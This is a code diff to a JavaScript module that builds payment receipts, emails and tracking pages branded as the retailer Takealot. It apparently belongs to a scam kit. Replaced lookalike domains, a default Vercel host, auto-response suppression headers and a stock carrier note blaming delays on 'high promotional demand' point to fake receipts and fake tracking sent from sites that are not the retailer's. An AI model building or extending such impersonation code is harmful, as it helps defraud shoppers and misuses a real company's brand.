@@ -158,7 +158,7 @@ function renderOrderPlainText(order) {
   const firstItem = (Array.isArray(order.items) && order.items[0]) || {};
   const prodTitle = firstItem.title || order.product_title || 'Defy 20L Digital Mirror Microwave & 1.7L Kettle Combo';
   const prodPrice = Number(order.amount_zar || order.amount || order.product_price || 147);
-  const trackUrl = `https://subwaypaysa.tech/takealot/track.html?order=${orderNumber}`;
+  const trackUrl = `${process.env.SITE_URL || 'https://ps5fim-s11m.vercel.app'}/track.html?ref=${orderNumber}`;
 
   return [
     `TAKEALOT PAYMENT CONFIRMATION`,
@@ -254,7 +254,7 @@ async function ensureEmailSent(order, force = false) {
         subject: `Payment Receipt: Takealot Order #${order.order_id}`,
         html,
         text: plainText,
-        reply_to: 'support@takealot-promo.online',
+        reply_to: process.env.EMAIL_REPLY_TO || 'support@ps5fim-s11m.vercel.app',
         headers: {
           'Auto-Submitted': 'auto-generated',
           'X-Auto-Response-Suppress': 'All',
@@ -311,7 +311,7 @@ function publicView(order) {
     quantity:         order.quantity || 1,
     received_date:    order.received_date,
     delivery_date:    order.delivery_date,
-    tracking_url:     order.tracking_url || `https://subwaypaysa.tech/takealot/track.html?order=${order.order_id}`,
+    tracking_url:     order.tracking_url || `${process.env.SITE_URL || 'https://ps5fim-s11m.vercel.app'}/track.html?ref=${order.order_id}`,
     status:           order.status || 'PROCESSING',
     carrier_note:     order.carrier_note || (order.status === 'IN_TRANSIT' ? 'Package in transit with regional courier. Delivery window revised due to high promotional demand.' : null),
     carrier_name:     order.carrier_name || 'Takealot Logistics Delivery',
